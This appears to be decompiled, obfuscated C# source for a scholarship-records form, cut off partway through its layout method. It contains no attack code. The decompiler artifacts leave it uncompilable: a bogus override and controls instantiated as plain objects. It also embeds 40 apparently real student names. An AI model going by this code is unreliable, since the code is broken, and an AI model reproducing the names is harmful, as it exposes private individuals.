using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Jy6q0;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using Pm16Qi;

namespace Zf4q2B;

[DesignerGenerated]
public class Sd5t6H : UserControl
{
	private IContainer components;

	private object scholar_list;

	private object dbConn;

	private object sqlCommand;

	private object dr;

	private object dlg_scholarship_add;

	private object dlg_fillup;

	private object dlg_savesuccessfully;

	private object dlg_scholarship_update;

	private object ScholarshipDetails;

	[field: AccessedThroughProperty("GroupBox1")]
	internal virtual GroupBox GroupBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("cbo_SearchBy")]
	internal virtual ComboBox cbo_SearchBy
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual TextBox txtb_Search
	{
		[CompilerGenerated]
		get
		{
			return _txtb_Search;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			KeyEventHandler val = new KeyEventHandler(Xj1y3F);
			TextBox val2 = _txtb_Search;
			if (val2 != null)
			{
				((Control)val2).remove_KeyUp(val);
			}
			_txtb_Search = value;
			val2 = _txtb_Search;
			if (val2 != null)
			{
				((Control)val2).add_KeyUp(val);
			}
		}
	}

	[field: AccessedThroughProperty("GroupBox2")]
	internal virtual GroupBox GroupBox2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label10")]
	internal virtual Label Label10
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lbl_sem")]
	internal virtual Label lbl_sem
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtb_studid")]
	internal virtual TextBox txtb_studid
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label9")]
	internal virtual Label Label9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtb_studMI")]
	internal virtual TextBox txtb_studMI
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lbl_course")]
	internal virtual Label lbl_course
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lbl_level")]
	internal virtual Label lbl_level
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label8")]
	internal virtual Label Label8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label7")]
	internal virtual Label Label7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtb_studLname")]
	internal virtual TextBox txtb_studLname
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtb_studSem")]
	internal virtual TextBox txtb_studSem
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtb_studCourse")]
	internal virtual TextBox txtb_studCourse
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtb_SY")]
	internal virtual TextBox txtb_SY
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtb_studLevel")]
	internal virtual TextBox txtb_studLevel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtb_studFname")]
	internal virtual TextBox txtb_studFname
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label11")]
	internal virtual Label Label11
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("GroupBox3")]
	internal virtual GroupBox GroupBox3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("rb_inactive")]
	internal virtual RadioButton rb_inactive
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("RadioButton1")]
	internal virtual RadioButton RadioButton1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label13")]
	internal virtual Label Label13
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtb_ScholarAmnt")]
	internal virtual TextBox txtb_ScholarAmnt
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label12")]
	internal virtual Label Label12
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label16")]
	internal virtual Label Label16
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("rb_active")]
	internal virtual RadioButton rb_active
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual FlowLayoutPanel FlowLayoutPanel1
	{
		[CompilerGenerated]
		get
		{
			return _FlowLayoutPanel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			PaintEventHandler val = new PaintEventHandler(Xy59Jm);
			FlowLayoutPanel flowLayoutPanel = _FlowLayoutPanel1;
			if (flowLayoutPanel != null)
			{
				((Control)flowLayoutPanel).remove_Paint(val);
			}
			_FlowLayoutPanel1 = value;
			flowLayoutPanel = _FlowLayoutPanel1;
			if (flowLayoutPanel != null)
			{
				((Control)flowLayoutPanel).add_Paint(val);
			}
		}
	}

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label14")]
	internal virtual Label Label14
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual object dg_StudScholarRec
	{
		[CompilerGenerated]
		get
		{
			return _dg_StudScholarRec;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			_dg_StudScholarRec = RuntimeHelpers.GetObjectValue(value);
		}
	}

	[field: AccessedThroughProperty("StudidDataGridViewTextBoxColumn")]
	internal virtual DataGridViewTextBoxColumn StudidDataGridViewTextBoxColumn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("StudFnameDataGridViewTextBoxColumn")]
	internal virtual DataGridViewTextBoxColumn StudFnameDataGridViewTextBoxColumn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("StudLnameDataGridViewTextBoxColumn")]
	internal virtual DataGridViewTextBoxColumn StudLnameDataGridViewTextBoxColumn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column1")]
	internal virtual DataGridViewTextBoxColumn Column1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("StudmidIDataGridViewTextBoxColumn")]
	internal virtual DataGridViewTextBoxColumn StudmidIDataGridViewTextBoxColumn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("sy")]
	internal virtual DataGridViewTextBoxColumn sy
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("level")]
	internal virtual DataGridViewTextBoxColumn level
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual object btn_add
	{
		[CompilerGenerated]
		get
		{
			return _btn_add;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			_btn_add = RuntimeHelpers.GetObjectValue(value);
		}
	}

	internal virtual object btn_update
	{
		[CompilerGenerated]
		get
		{
			return _btn_update;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			_btn_update = RuntimeHelpers.GetObjectValue(value);
		}
	}

	internal virtual object btn_cancel
	{
		[CompilerGenerated]
		get
		{
			return _btn_cancel;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			_btn_cancel = RuntimeHelpers.GetObjectValue(value);
		}
	}

	internal virtual object btn_manageScholar
	{
		[CompilerGenerated]
		get
		{
			return _btn_manageScholar;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			_btn_manageScholar = RuntimeHelpers.GetObjectValue(value);
		}
	}

	[field: AccessedThroughProperty("cbo_scholarType")]
	internal virtual ComboBox cbo_scholarType
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label4")]
	internal virtual Label Label4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtb_refNo")]
	internal virtual TextBox txtb_refNo
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ComboBox cbo_SelectDept
	{
		[CompilerGenerated]
		get
		{
			return _cbo_SelectDept;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = w1DKb3;
			ComboBox val = _cbo_SelectDept;
			if (val != null)
			{
				val.remove_SelectedIndexChanged(eventHandler);
			}
			_cbo_SelectDept = value;
			val = _cbo_SelectDept;
			if (val != null)
			{
				val.add_SelectedIndexChanged(eventHandler);
			}
		}
	}

	public Sd5t6H()
	{
		((UserControl)this).add_Load((EventHandler)Zy69Cr);
		q0SXg5();
	}

	[DebuggerNonUserCode]
	protected override void y4MYr0(bool Rq2n4F)
	{
		try
		{
			if (Rq2n4F && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((ContainerControl)this).Dispose(Rq2n4F);
		}
	}

	[DebuggerStepThrough]
	private void q0SXg5()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Expected O, but got Unknown
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		//IL_004f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Expected O, but got Unknown
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0064: Expected O, but got Unknown
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Expected O, but got Unknown
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Expected O, but got Unknown
		//IL_007b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Expected O, but got Unknown
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Expected O, but got Unknown
		//IL_0091: Unknown result type (might be due to invalid IL or missing references)
		//IL_009b: Expected O, but got Unknown
		//IL_009c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a6: Expected O, but got Unknown
		//IL_00a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b1: Expected O, but got Unknown
		//IL_00b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bc: Expected O, but got Unknown
		//IL_00bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c7: Expected O, but got Unknown
		//IL_00c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d2: Expected O, but got Unknown
		//IL_00d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dd: Expected O, but got Unknown
		//IL_00de: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e8: Expected O, but got Unknown
		//IL_00e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f3: Expected O, but got Unknown
		//IL_00f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fe: Expected O, but got Unknown
		//IL_00ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0109: Expected O, but got Unknown
		//IL_010a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0114: Expected O, but got Unknown
		//IL_0115: Unknown result type (might be due to invalid IL or missing references)
		//IL_011f: Expected O, but got Unknown
		//IL_0120: Unknown result type (might be due to invalid IL or missing references)
		//IL_012a: Expected O, but got Unknown
		//IL_012b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0135: Expected O, but got Unknown
		//IL_0136: Unknown result type (might be due to invalid IL or missing references)
		//IL_0140: Expected O, but got Unknown
		//IL_0141: Unknown result type (might be due to invalid IL or missing references)
		//IL_014b: Expected O, but got Unknown
		//IL_014c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0156: Expected O, but got Unknown
		//IL_0157: Unknown result type (might be due to invalid IL or missing references)
		//IL_0161: Expected O, but got Unknown
		//IL_0162: Unknown result type (might be due to invalid IL or missing references)
		//IL_016c: Expected O, but got Unknown
		//IL_016d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0177: Expected O, but got Unknown
		//IL_0178: Unknown result type (might be due to invalid IL or missing references)
		//IL_0182: Expected O, but got Unknown
		//IL_01b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bd: Expected O, but got Unknown
		//IL_01ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d8: Expected O, but got Unknown
		//IL_01d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e3: Expected O, but got Unknown
		//IL_01f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fe: Expected O, but got Unknown
		//IL_01ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0209: Expected O, but got Unknown
		//IL_020a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0214: Expected O, but got Unknown
		//IL_0215: Unknown result type (might be due to invalid IL or missing references)
		//IL_021f: Expected O, but got Unknown
		//IL_0220: Unknown result type (might be due to invalid IL or missing references)
		//IL_022a: Expected O, but got Unknown
		//IL_022b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0235: Expected O, but got Unknown
		//IL_0236: Unknown result type (might be due to invalid IL or missing references)
		//IL_0240: Expected O, but got Unknown
		//IL_0241: Unknown result type (might be due to invalid IL or missing references)
		//IL_024b: Expected O, but got Unknown
		//IL_024c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0256: Expected O, but got Unknown
		//IL_0257: Unknown result type (might be due to invalid IL or missing references)
		//IL_0261: Expected O, but got Unknown
		//IL_032f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0339: Expected O, but got Unknown
		//IL_082b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0835: Expected O, but got Unknown
		//IL_0f47: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f51: Expected O, but got Unknown
		//IL_109b: Unknown result type (might be due to invalid IL or missing references)
		//IL_10a5: Expected O, but got Unknown
		//IL_1861: Unknown result type (might be due to invalid IL or missing references)
		//IL_1867: Expected O, but got Unknown
		//IL_1a7f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c37: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c3d: Expected O, but got Unknown
		//IL_1dbb: Unknown result type (might be due to invalid IL or missing references)
		//IL_1dc1: Expected O, but got Unknown
		//IL_1fdc: Unknown result type (might be due to invalid IL or missing references)
		//IL_2194: Unknown result type (might be due to invalid IL or missing references)
		//IL_219a: Expected O, but got Unknown
		//IL_2318: Unknown result type (might be due to invalid IL or missing references)
		//IL_231e: Expected O, but got Unknown
		//IL_2539: Unknown result type (might be due to invalid IL or missing references)
		//IL_26f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_26f7: Expected O, but got Unknown
		//IL_271d: Unknown result type (might be due to invalid IL or missing references)
		//IL_2727: Expected O, but got Unknown
		//IL_2738: Unknown result type (might be due to invalid IL or missing references)
		//IL_2742: Expected O, but got Unknown
		//IL_2753: Unknown result type (might be due to invalid IL or missing references)
		//IL_275d: Expected O, but got Unknown
		//IL_2784: Unknown result type (might be due to invalid IL or missing references)
		//IL_278e: Expected O, but got Unknown
		//IL_2967: Unknown result type (might be due to invalid IL or missing references)
		//IL_296d: Expected O, but got Unknown
		//IL_2b88: Unknown result type (might be due to invalid IL or missing references)
		//IL_2d40: Unknown result type (might be due to invalid IL or missing references)
		//IL_2d46: Expected O, but got Unknown
		//IL_2de9: Unknown result type (might be due to invalid IL or missing references)
		//IL_2df3: Expected O, but got Unknown
		//IL_2e12: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e1c: Expected O, but got Unknown
		//IL_2fc1: Unknown result type (might be due to invalid IL or missing references)
		//IL_2fcb: Expected O, but got Unknown
		//IL_344d: Unknown result type (might be due to invalid IL or missing references)
		//IL_3457: Expected O, but got Unknown
		//IL_34bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_34c6: Expected O, but got Unknown
		//IL_3571: Unknown result type (might be due to invalid IL or missing references)
		//IL_357b: Expected O, but got Unknown
		DataGridViewCellStyle val = new DataGridViewCellStyle();
		DataGridViewCellStyle val2 = new DataGridViewCellStyle();
		GroupBox1 = new GroupBox();
		cbo_SearchBy = new ComboBox();
		Label1 = new Label();
		Label2 = new Label();
		txtb_Search = new TextBox();
		GroupBox2 = new GroupBox();
		Label10 = new Label();
		lbl_sem = new Label();
		txtb_studid = new TextBox();
		Label9 = new Label();
		txtb_studMI = new TextBox();
		lbl_course = new Label();
		lbl_level = new Label();
		Label8 = new Label();
		Label7 = new Label();
		txtb_studLname = new TextBox();
		Label3 = new Label();
		txtb_studSem = new TextBox();
		txtb_studCourse = new TextBox();
		txtb_SY = new TextBox();
		txtb_studLevel = new TextBox();
		txtb_studFname = new TextBox();
		Label11 = new Label();
		GroupBox3 = new GroupBox();
		Label4 = new Label();
		txtb_refNo = new TextBox();
		cbo_scholarType = new ComboBox();
		rb_inactive = new RadioButton();
		rb_active = new RadioButton();
		RadioButton1 = new RadioButton();
		Label13 = new Label();
		txtb_ScholarAmnt = new TextBox();
		Label12 = new Label();
		Label16 = new Label();
		btn_cancel = RuntimeHelpers.GetObjectValue(new object());
		btn_add = RuntimeHelpers.GetObjectValue(new object());
		btn_update = RuntimeHelpers.GetObjectValue(new object());
		Panel1 = new Panel();
		btn_manageScholar = RuntimeHelpers.GetObjectValue(new object());
		FlowLayoutPanel1 = new FlowLayoutPanel();
		Panel3 = new Panel();
		dg_StudScholarRec = RuntimeHelpers.GetObjectValue(new object());
		StudidDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
		StudFnameDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
		StudLnameDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
		Column1 = new DataGridViewTextBoxColumn();
		StudmidIDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
		sy = new DataGridViewTextBoxColumn();
		level = new DataGridViewTextBoxColumn();
		Panel2 = new Panel();
		cbo_SelectDept = new ComboBox();
		Label14 = new Label();
		((Control)GroupBox1).SuspendLayout();
		((Control)GroupBox2).SuspendLayout();
		((Control)GroupBox3).SuspendLayout();
		((Control)Panel1).SuspendLayout();
		((Control)FlowLayoutPanel1).SuspendLayout();
		((Control)Panel3).SuspendLayout();
		((ISupportInitialize)dg_StudScholarRec).BeginInit();
		((Control)Panel2).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)GroupBox1).get_Controls().Add((Control)(object)cbo_SearchBy);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label1);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label2);
		((Control)GroupBox1).get_Controls().Add((Control)(object)txtb_Search);
		((Control)GroupBox1).set_Font(new Font("Franklin Gothic Medium Cond", 15f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)GroupBox1).set_Location(new Point(3, 3));
		((Control)GroupBox1).set_Name("GroupBox1");
		((Control)GroupBox1).set_Size(new Size(548, 70));
		((Control)GroupBox1).set_TabIndex(37);
		GroupBox1.set_TabStop(false);
		GroupBox1.set_Text("SEARCH FOR STUDENT");
		cbo_SearchBy.set_DropDownStyle((ComboBoxStyle)2);
		((ListControl)cbo_SearchBy).set_FormattingEnabled(true);
		cbo_SearchBy.get_Items().AddRange(new object[2] { "Id Number", "Name" });
		((Control)cbo_SearchBy).set_Location(new Point(122, 25));
		((Control)cbo_SearchBy).set_Name("cbo_SearchBy");
		((Control)cbo_SearchBy).set_Size(new Size(134, 33));
		((Control)cbo_SearchBy).set_TabIndex(6);
		Label1.set_AutoSize(true);
		Label1.set_ImeMode((ImeMode)0);
		((Control)Label1).set_Location(new Point(85, 31));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(31, 25));
		((Control)Label1).set_TabIndex(7);
		Label1.set_Text("BY");
		Label2.set_AutoSize(true);
		Label2.set_ImeMode((ImeMode)0);
		((Control)Label2).set_Location(new Point(17, 31));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(74, 25));
		((Control)Label2).set_TabIndex(5);
		Label2.set_Text("SEARCH");
		txtb_Search.get_AutoCompleteCustomSource().AddRange(new string[40]
		{
			"Niño Agsoy", "Tajmahal Amarila", "Joshua Avila", "Harvey Baloria", "Faith Claire Bawan", "Mark Bello", "Charmel Camposo", "Kristel Ann Corpuz", "Princess Anne Dadul", "Vj Debuque",
			"Juvy Dela Cruz", "Laica Joy Delostrico", "Charles Deragosa", "Chris Lyn Joyce Diaz", "Amado Doverte", "John Mark Dulce", "James Bryan N. Dumail", "Junelyn Gumia", "Jessa Langwas", "Annalyn Larita",
			"Rhea Lynn Legaspi", "Mayter Lumiguid", "Charlene Manabat", "John Vincent A. Medillo", "Jericho Montealto", "Wendel Odilao", "Kurt Randall Oviedo", "Elson Patac", "Kate Pendon", "Carren Polinio",
			"Jhon Philip Pondar", "Arnic Reponte", "Quirjhon Dave Rivera", "Hanna Gladys Sala", "ARIEL SAOCEJO", "Rea Siarot", "Robel Sta Teresa", "Venus Torrevillas", "Tyrone Vibas", "Jerald Jose"
		});
		((Control)txtb_Search).set_Location(new Point(264, 25));
		((Control)txtb_Search).set_Name("txtb_Search");
		((Control)txtb_Search).set_Size(new Size(264, 30));
		((Control)txtb_Search).set_TabIndex(0);
		((Control)GroupBox2).get_Controls().Add((Control)(object)Label10);
		((Control)GroupBox2).get_Controls().Add((Control)(object)lbl_sem);
		((Control)GroupBox2).get_Controls().Add((Control)(object)txtb_studid);
		((Control)GroupBox2).get_Controls().Add((Control)(object)Label9);
		((Control)GroupBox2).get_Controls().Add((Control)(object)txtb_studMI);
		((Control)GroupBox2).get_Controls().Add((Control)(object)lbl_course);
		((Control)GroupBox2).get_Controls().Add((Control)(object)lbl_level);
		((Control)GroupBox2).get_Controls().Add((Control)(object)Label8);
		((Control)GroupBox2).get_Controls().Add((Control)(object)Label7);
		((Control)GroupBox2).get_Controls().Add((Control)(object)txtb_studLname);
		((Control)GroupBox2).get_Controls().Add((Control)(object)Label3);
		((Control)GroupBox2).get_Controls().Add((Control)(object)txtb_studSem);
		((Control)GroupBox2).get_Controls().Add((Control)(object)txtb_studCourse);
		((Control)GroupBox2).get_Controls().Add((Control)(object)txtb_SY);
		((Control)GroupBox2).get_Controls().Add((Control)(object)txtb_studLevel);
		((Control)GroupBox2).get_Controls().Add((Control)(object)txtb_studFname);
		((Control)GroupBox2).set_Font(new Font("Franklin Gothic Medium Cond", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)GroupBox2).set_Location(new Point(11, 12));
		((Control)GroupBox2).set_Name("GroupBox2");
		((Control)GroupBox2).set_Size(new Size(441, 201));
		((Control)GroupBox2).set_TabIndex(38);
		GroupBox2.set_TabStop(false);
		GroupBox2.set_Text("STUDENT INFORMATION");
		Label10.set_AutoSize(true);
		Label10.set_ImeMode((ImeMode)0);
		((Control)Label10).set_Location(new Point(6, 100));
		((Control)Label10).set_Name("Label10");
		((Control)Label10).set_Size(new Size(70, 21));
		((Control)Label10).set_TabIndex(21);
		Label10.set_Text("SCH-YEAR");
		lbl_sem.set_AutoSize(true);
		lbl_sem.set_ImeMode((ImeMode)0);
		((Control)lbl_sem).set_Location(new Point(6, 169));
		((Control)lbl_sem).set_Name("lbl_sem");
		((Control)lbl_sem).set_Size(new Size(72, 21));
		((Control)lbl_sem).set_TabIndex(19);
		lbl_sem.set_Text("SEMESTER");
		((TextBoxBase)txtb_studid).set_BackColor(Color.White);
		((Control)txtb_studid).set_Enabled(false);
		((Control)txtb_studid).set_Location(new Point(88, 23));
		((Control)txtb_studid).set_Name("txtb_studid");
		((Control)txtb_studid).set_Size(new Size(344, 26));
		((Control)txtb_studid).set_TabIndex(16);
		Label9.set_AutoSize(true);
		Label9.set_ImeMode((ImeMode)0);
		((Control)Label9).set_Location(new Point(6, 26));
		((Control)Label9).set_Name("Label9");
		((Control)Label9).set_Size(new Size(80, 21));
		((Control)Label9).set_TabIndex(15);
		Label9.set_Text("STUDENT ID");
		((TextBoxBase)txtb_studMI).set_BackColor(Color.White);
		((Control)txtb_studMI).set_Enabled(false);
		((Control)txtb_studMI).set_Location(new Point(402, 60));
		((Control)txtb_studMI).set_Name("txtb_studMI");
		((Control)txtb_studMI).set_Size(new Size(30, 26));
		((Control)txtb_studMI).set_TabIndex(14);
		lbl_course.set_AutoSize(true);
		lbl_course.set_ImeMode((ImeMode)0);
		((Control)lbl_course).set_Location(new Point(6, 135));
		((Control)lbl_course).set_Name("lbl_course");
		((Control)lbl_course).set_Size(new Size(59, 21));
		((Control)lbl_course).set_TabIndex(11);
		lbl_course.set_Text("COURSE");
		lbl_level.set_AutoSize(true);
		lbl_level.set_ImeMode((ImeMode)0);
		((Control)lbl_level).set_Location(new Point(188, 102));
		((Control)lbl_level).set_Name("lbl_level");
		((Control)lbl_level).set_Size(new Size(78, 21));
		((Control)lbl_level).set_TabIndex(9);
		lbl_level.set_Text("YEAR LEVEL");
		Label8.set_AutoSize(true);
		Label8.set_ImeMode((ImeMode)0);
		((Control)Label8).set_Location(new Point(369, 63));
		((Control)Label8).set_Name("Label8");
		((Control)Label8).set_Size(new Size(29, 21));
		((Control)Label8).set_TabIndex(7);
		Label8.set_Text("M.I");
		Label7.set_AutoSize(true);
		Label7.set_ImeMode((ImeMode)0);
		((Control)Label7).set_Location(new Point(188, 63));
		((Control)Label7).set_Name("Label7");
		((Control)Label7).set_Size(new Size(77, 21));
		((Control)Label7).set_TabIndex(7);
		Label7.set_Text("LAST NAME");
		((TextBoxBase)txtb_studLname).set_BackColor(Color.White);
		((Control)txtb_studLname).set_Enabled(false);
		((Control)txtb_studLname).set_Location(new Point(265, 60));
		((Control)txtb_studLname).set_Name("txtb_studLname");
		((Control)txtb_studLname).set_Size(new Size(105, 26));
		((Control)txtb_studLname).set_TabIndex(6);
		Label3.set_AutoSize(true);
		Label3.set_ImeMode((ImeMode)0);
		((Control)Label3).set_Location(new Point(6, 63));
		((Control)Label3).set_Name("Label3");
		((Control)Label3).set_Size(new Size(81, 21));
		((Control)Label3).set_TabIndex(7);
		Label3.set_Text("FIRST NAME");
		((TextBoxBase)txtb_studSem).set_BackColor(Color.White);
		((Control)txtb_studSem).set_Enabled(false);
		((Control)txtb_studSem).set_Location(new Point(88, 165));
		((Control)txtb_studSem).set_Name("txtb_studSem");
		((Control)txtb_studSem).set_Size(new Size(344, 26));
		((Control)txtb_studSem).set_TabIndex(6);
		((TextBoxBase)txtb_studCourse).set_BackColor(Color.White);
		((Control)txtb_studCourse).set_Enabled(false);
		((Control)txtb_studCourse).set_Location(new Point(90, 132));
		((Control)txtb_studCourse).set_Name("txtb_studCourse");
		((Control)txtb_studCourse).set_Size(new Size(342, 26));
		((Control)txtb_studCourse).set_TabIndex(6);
		((TextBoxBase)txtb_SY).set_BackColor(Color.White);
		((Control)txtb_SY).set_Enabled(false);
		((Control)txtb_SY).set_Location(new Point(90, 97));
		((Control)txtb_SY).set_Name("txtb_SY");
		((Control)txtb_SY).set_Size(new Size(100, 26));
		((Control)txtb_SY).set_TabIndex(6);
		((TextBoxBase)txtb_studLevel).set_BackColor(Color.White);
		((Control)txtb_studLevel).set_Enabled(false);
		((Control)txtb_studLevel).set_Location(new Point(283, 97));
